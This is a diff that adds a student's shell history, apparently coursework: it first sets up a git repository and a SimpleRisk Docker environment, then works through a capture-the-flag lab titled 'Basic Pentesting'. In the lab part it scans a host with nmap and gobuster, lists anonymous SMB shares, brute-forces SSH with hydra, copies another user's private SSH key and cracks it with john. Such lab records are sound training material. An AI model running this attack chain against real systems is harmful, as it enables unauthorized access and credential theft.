@@ -1,0 +1,199 @@
+    1  git --version
+    2  sudo apt update
+    3  sudo apt install git -y
+    4  git --version
+    5  git clone https://github.com/UCHSeguridad2026/UCH_Gesti-nDeRiesgos.git
+    6  cd UCH_Gesti-nDeRiesgos
+    7  git branch -a
+    8  git checkout entrega/diaz-maximiliano-31059979
+    9  git branch
+   10  mkdir -p entregas/diaz-maximiliano-31059979/{entorno,informe/capturas,configuracion,scripts,reporte-ejecutivo}
+   11  touch entregas/diaz-maximiliano-31059979/README.md
+   12  touch entregas/diaz-maximiliano-31059979/.gitignore
+   13  touch entregas/diaz-maximiliano-31059979/entorno/docker-compose.yml
+   14  touch entregas/diaz-maximiliano-31059979/informe/informe.md
+   15  touch entregas/diaz-maximiliano-31059979/configuracion/usuarios.md
+   16  touch entregas/diaz-maximiliano-31059979/configuracion/riesgos.md
+   17  tree entregas/diaz-maximiliano-31059979
+   18  sudo apt install tree -y
+   19  tree entregas/diaz-maximiliano-31059979
+   20  git config --global user.email "diazmaximiliano@uch.edu.ar"
+   21  git config --global user.name "Maximiliano Diaz"
+   22  git config --global --list
+   23  git config --global user.name
+   24  git config --global user.email
+   25  git branch --show-current
+   26  git status
+   27  nano entregas/diaz-maximiliano-31059979/.gitignore
+   28  cat entregas/diaz-maximiliano-31059979/.gitignore
+   29  docker --version
+   30  sudo apt update
+   31  sudo apt install docker.io docker-compose-v2 -y
+   32  docker --version
+   33  docker compose version
+   34  cd ~/UCH_Gesti-nDeRiesgos/entregas/diaz-maximiliano-31059979/entorno
+   35  nano docker-compose.yml
+   36  nano .env
+   37  cat .env
+   38  nano docker-compose.yml
+   39  docker compose config
+   40  docker compose ps
+   41  sudo usermod -aG docker $USER
+   42  docker ps
+   43  cd ~/UCH_Gesti-nDeRiesgos/entregas/diaz-maximiliano-31059979/entorno
+   44  docker compose up -d
+   45  docker compose ps
+   46  docker compose logs simplerisk --tail=50
+   47  docker compose down
+   48  docker volume rm entorno_simplerisk-config
+   49  nano docker-compose.yml
+   50  docker compose up -d
+   51  docker compose ps
+   52  docker compose logs simplerisk --tail=30
+   53  curl -I http://localhost:8080
+   54  nano docker-compose.yml
+   55  docker compose up -d
+   56  [200~nano ~/UCH_Gesti-nDeRiesgos/entregas/diaz-maximiliano-31059979/configuracion/usuarios.md~
+   57  nano ~/UCH_Gesti-nDeRiesgos/entregas/diaz-maximiliano-31059979/configuracion/usuarios.md
+   58  nano entregas/diaz-maximiliano-31059979/configuracion/riesgos.md
+   59  cd ~/UCH_Gesti-nDeRiesgos
+   60  ls
+   61  mkdir -p entregas/diaz-maximiliano-31059979/configuracion
+   62  nano entregas/diaz-maximiliano-31059979/configuracion/riesgos.md
+   63  cd ~/UCH_Gesti-nDeRiesgos/entregas/diaz-maximiliano-31059979
+   64  ls configuracion
+   65  nano configuracion/riesgos.md
+   66  cat configuracion/riesgos.md
+   67  nano README.md
+   68  docker compose up -d
+   69  cd entorno
+   70  docker compose up -d
+   71  docker compose ps
+   72  cd ..
+   73  nano configuracion/riesgos.md
+   74  cat configuracion/riesgos.md
+   75  cd ~/UCH_Gesti-nDeRiesgos/entregas/diaz-maximiliano-31059979
+   76  nano informe/informe.md
+   77  cd ~/UCH_Gesti-nDeRiesgos
+   78  git status
+   79  git status --short --untracked-files=all
+   80  rm "entregas/diaz-maximiliano-31059979/informe/capturas/.png"
+   81  git status --short --untracked-files=all
+   82  git add entregas/diaz-maximiliano-31059979/
+   83  git status
+   84  git diff --cached --stat
+   85  git diff --cached -- entregas/diaz-maximiliano-31059979/README.md entregas/diaz-maximiliano-31059979/configuracion/riesgos.md entregas/diaz-maximiliano-31059979/informe/informe.md
+   86  grep -n "R4" entregas/diaz-maximiliano-31059979/configuracion/riesgos.md
+   87  cd ~/UCH_Gesti-nDeRiesgos
+   88  grep -n "R4" entregas/diaz-maximiliano-31059979/configuracion/riesgos.md
+   89  grep -n "R4" entregas/diaz-maximiliano-31059979/informe/informe.md
+   90  sed -n '47,60p' entregas/diaz-maximiliano-31059979/configuracion/riesgos.md
+   91  grep -n -i "Filtración de datos de pacientes" entregas/diaz-maximiliano-31059979/informe/informe.md
+   92  nano entregas/diaz-maximiliano-31059979/configuracion/riesgos.md
+   93  nano entregas/diaz-maximiliano-31059979/informe/informe.md
+   94  ~/UCH_Gesti-nDeRiesgos
+   95  git status --short && grep -nE '^### R[1-7]|\*\*Probabilidad|\*\*Impacto|\*\*Nivel' entregas/diaz-maximiliano-31059979/configuracion/riesgos.md
+   96  cd ~/UCH_Gesti-nDeRiesgos
+   97  sed -i '/### R3/,/### R4/{s/\*\*Nivel:\*\* Alto/**Nivel:** Medio/}' entregas/diaz-maximiliano-31059979/configuracion/riesgos.md
+   98  sed -i '/### R5/,/### R6/{s/\*\*Nivel:\*\* Alto/**Nivel:** Medio/}' entregas/diaz-maximiliano-31059979/configuracion/riesgos.md
+   99  sed -i '/### R6/,/### R7/{s/\*\*Nivel:\*\* Alto/**Nivel:** Medio/}' entregas/diaz-maximiliano-31059979/configuracion/riesgos.md
+  100  rm -- 'ol" '
+  101  git status --short
+  102  grep -nE '^### R[1-7]|\*\*Probabilidad|\*\*Impacto|\*\*Nivel' entregas/diaz-maximiliano-31059979/configuracion/riesgos.md
+  103  git add entregas/diaz-maximiliano-31059979/
+  104  git diff --cached --check
+  105  ssh-keygen -t ed25519 -C "diazmaximiliano@uch.edu.ar"
+  106  cat ~/.ssh/id_ed25519.pub
+  107  cd ~/UCH_Gesti-nDeRiesgos
+  108  git remote set-url origin git@github.com:UCHSeguridad2026/UCH_Gesti-nDeRiesgos.git
+  109  ssh -T git@github.com
+  110  git push origin entrega/diaz-maximiliano-31059979
+  111  cd ~/UCH_Gesti-nDeRiesgos
+  112  git branch
+  113  git commit -m "Entrega TP SimpleRisk: análisis y tratamiento de riesgos"
+  114  git push origin entrega/diaz-maximiliano-31059979
+  115  git status
+  116  git log -1 --oneline
+  117  git add entregas/diaz-maximiliano-31059979/reporte-ejecutivo/reporte.pdf
+  118  git commit -m "Actualiza reporte ejecutivo"
+  119  git push origin entrega/diaz-maximiliano-31059979
+  120  ip addr show tun0
+  121  ping -c 4 10.67.173.170
+  122  nmap -Pn -sC -sV 10.67.173.170
+  123  nano ~/TP_THM/bitacora/clase_01_nmap.txt
+  124  cat ~/TP_THM/bitacora/clase_01_nmap.txt
+  125  nmap -Pn -sC -sV 10.67.173.170 -oN ~/TP_THM/bitacora/clase_01_nmap.txt
+  126  cat ~/TP_THM/bitacora/clase_01_nmap.txt
+  127  ls -l ~/TP_THM/evidencias/escaneo/
+  128  gobuster version
+  129  sudo apt update
+  130  gobuster version
+  131  sudo apt install gobuster
+  132  gobuster version
+  133  gobuster dir -u http://10.67.173.170 -w /usr/share/wordlists/dirb/common.txt -o ~/TP_THM/bitacora/clase_01_gobuster.txt
+  134  ls /usr/share/wordlists/
+  135  sudo apt install dirb
+  136  ls /usr/share/wordlists/dirb/
+  137  dpkg -L dirb | grep -E 'wordlist|common'
+  138  gobuster dir -u http://10.67.173.170 -w /usr/share/dirb/wordlists/common.txt -o ~/TP_THM/bitacora/clase_01_gobuster.txt
+  139  ping -c 4 10.67.151.105
+  140  nmap -Pn -sC -sV 10.67.151.105 -oN ~/TP_THM/bitacora/clase_01_nmap_2.txt
+  141  cat ~/TP_THM/bitacora/clase_01_nmap_2.txt
+  142  gobuster dir -u http://10.67.151.105 -w /usr/share/dirb/wordlists/common.txt -o ~/TP_THM/bitacora/clase_01_gobuster_2.txt
+  143  cat ~/TP_THM/bitacora/clase_01_gobuster_2.txt
+  144  curl -s http://10.67.151.105/development/
+  145  curl -s http://10.67.151.105/development/dev.txt
+  146  curl -s http://10.67.151.105/development/j.txt
+  147  nmap -Pn -p 139,445 --script smb-enum-shares,smb-enum-users 10.67.151.105
+  148  nmap -Pn -p 139,445 --script smb-enum-shares,smb-enum-users 10.67.151.105 -oN ~/TP_THM/bitacora/clase_01_smb_enum.txt
+  149  smbclient -L //10.67.151.105 -N
+  150  ls
+  151  smbclient //10.67.151.105/Anonymous -N
+  152  cat staff.txt
+  153  cp ~/staff.txt ~/TP_THM/evidencias/reconocimiento/staff.txt
+  154  ls -l ~/TP_THM/evidencias/reconocimiento/staff.txt
+  155  smbclient -L //10.67.151.105 -N
+  156  rpcclient -U "" -N 10.67.151.105
+  157  ssh jan@10.67.151.105
+  158  ls -lh /usr/share/wordlists/rockyou.txt
+  159  sudo apt update
+  160  sudo apt install wordlists
+  161  ls -lh /usr/share/wordlists/
+  162  ls -lh /usr/share/dirb/wordlists/common.txt
+  163  hydra -l jan -P /usr/share/dirb/wordlists/common.txt ssh://10.67.151.105 -o ~/TP_THM/bitacora/clase_01_hydra_ssh.txt
+  164  sudo apt install hydra
+  165  hydra -h | head
+  166  hydra -l jan -P /usr/share/dirb/wordlists/common.txt ssh://10.67.151.105 -o ~/TP_THM/bitacora/clase_01_hydra_ssh.txt
+  167  cat ~/TP_THM/evidencias/reconocimiento/staff.txt
+  168  curl -s http://10.67.151.105/development/j.txt
+  169  printf '%s\n' '[REDACTED]' > /tmp/jan.txt
+  170  hydra -l jan -P /tmp/jan.txt ssh://10.67.151.105 -t 4
+  171  ssh jan@10.67.151.105
+  172  scp jan@10.67.151.105:/home/kay/.ssh/id_rsa /tmp/kay_id_rsa
+  173  chmod 600 /tmp/kay_id_rsa
+  174  ssh -i /tmp/kay_id_rsa kay@10.67.151.105
+  175  ssh-keygen -y -f /tmp/kay_id_rsa
+  176  sudo apt install -y john
+  177  ssh2john /tmp/kay_id_rsa > /tmp/kay_hash.txt
+  178  head -c 100 /tmp/kay_hash.txt
+  179  echo
+  180  head -c 100 /tmp/kay_hash.txt
+  181  echo
+  182  sudo apt install -y john
+  183  find /usr/share/john -name 'ssh2john*' 2>/dev/null
+  184  ssh -i /tmp/kay_id_rsa kay@10.67.151.105
+  185  printf '%s\n' 'SHA-256 de /root/flag.txt (10.67.151.105): 852afba51134631548962400b2970b958e1a5b3cf52c48ee1433d9930fcb2a21' > ~/TP_THM/bitacora/clase_01_flag_hash.txt
+  186  cat ~/TP_THM/bitacora/clase_01_flag_hash.txt
+  187  cd ~/TP_THM
+  188  git status --short
+  189  cd ~/TP_THM
+  190  sed -i 's/password: [REDACTED]/password: [REDACTED]/g' bitacora/clase_01_hydra_ssh.txt
+  191  git add bitacora/clase_01_flag_hash.txt bitacora/clase_01_gobuster_2.txt bitacora/clase_01_hydra_ssh.txt bitacora/clase_01_nmap_2.txt bitacora/clase_01_smb_enum.txt evidencias/escaneo/escaneo_gobuster_development.png evidencias/reconocimiento/staff.txt
+  192  git status --short
+  193  git diff --cached --stat
+  194  git diff --cached --name-only
+  195  git commit -m "Documentar Basic Pentesting"
+  196  git push origin diaz-maximiliano
+  197  git status
+  198  cd ~/TP_THM
+  199  history > bitacora/clase_01_historial.txt
